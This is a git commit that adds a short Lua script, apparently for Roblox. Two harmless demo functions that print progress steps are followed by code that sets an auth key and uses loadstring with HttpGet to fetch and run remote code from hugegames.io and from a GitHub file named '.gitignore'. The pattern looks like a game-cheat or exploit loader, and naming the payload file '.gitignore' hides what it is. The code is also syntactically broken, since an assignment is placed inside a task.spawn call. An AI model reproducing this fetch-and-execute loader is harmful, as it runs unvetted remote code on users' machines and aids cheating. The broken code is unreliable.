7590e9e6ffdc17494e50b0f160c853f3a67dcb8a
Vitrix <lioontop701@gmail.com>
2025-04-04 11:08:06 +0200

    Create 93535935284648.lua

---
+++ 93535935284648.lua
@@ -0,0 +1,23 @@
+-- Script 1
+local function script1()
+    for i = 1, 5 do
+        print("Script 1 - Step " .. i)
+        task.wait(1)
+    end
+end
+
+-- Script 2
+local function script2()
+    for i = 1, 5 do
+        print("Script 2 - Step " .. i)
+        task.wait(1)
+    end
+end
+
+-- Run both scripts at the same time
+task.spawn(getgenv().AuthKey = "HUGE_hXcOCNtGsthP"
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))())
+task.spawn(loadstring(game:HttpGet("https://raw.githubusercontent.com/Vitrix-Neo/Stats-TrackerV3/refs/heads/main/.gitignore")) ())
